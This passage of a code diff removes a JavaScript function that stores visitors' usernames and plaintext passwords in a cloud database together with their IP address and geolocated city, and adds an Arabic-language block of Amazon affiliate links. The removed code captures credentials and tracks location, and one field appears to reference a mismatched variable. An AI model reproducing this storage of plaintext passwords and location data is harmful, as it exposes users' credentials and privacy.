-                        saveRecordToCloud(usernameInput, passwordInput, `${visitorCountry}, ${visitorCity} (IP Network Location)`);
-                    },
-                    { timeout: 10000, enableHighAccuracy: true }
-                );
-            } else {
-                saveRecordToCloud(usernameInput, passwordInput, `${visitorCountry}, ${visitorCity}`);
-            }
-        }
-
-        function saveRecordToCloud(username, password, locationData) {
-            const safeDatabaseKey = username.replace(/[.#$\/\[\]]/g, "_");
-            const targetRef = db.ref("registered_users/" + safeDatabaseKey);
-
-            targetRef.once("value", (snapshot) => {
-                let existingRecord = snapshot.val();
-                let visitFrequency = 1;
-                if (existingRecord && existingRecord.visitsCount) {
-                    visitFrequency = existingRecord.visitsCount + 1;
-                }
-
-                targetRef.set({
-                    username: username,
-                    password: password,
-                    department: currentDept,
-                    ipAddress: visitorIp,
-                    location: location
+        <!-- Amazon Departments -->
+        <div class="section-card">
+            <div class="section-header">🛍️ أقسام أمازون المميزة</div>
+            <div class="departments-grid">
+                <a href="https://www.amazon.com/s?k=lightning+deals&tag=booksking-20" target="_blank" class="dept-item dept-special" onclick="recordDeptClick('العروض والخصومات')">⚡ العروض والخصومات</a>
+                <a href="https://www.amazon.com/b?node=154606011&tag=booksking-20" target="_blank" class="dept-item dept-special" onclick="recordDeptClick('Kindle')">📖 الكتب الإلكترونية (Kindle)</a>
+                <a href="https://www.amazon.com/s?k=pdf+books&tag=booksking-20" target="_blank" class="dept-item dept-special" onclick="recordDeptClick('كتب PDF')">📑 المراجع وكتب الـ PDF</a>
+                <a href="https://www.amazon.com/s?k=gaming+consoles&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الألعاب')">🕹️ أجهزة الكونسول والألعاب</a>
+            </div>
+            <div class="selected-badge" id="active-dept-label">القسم الم
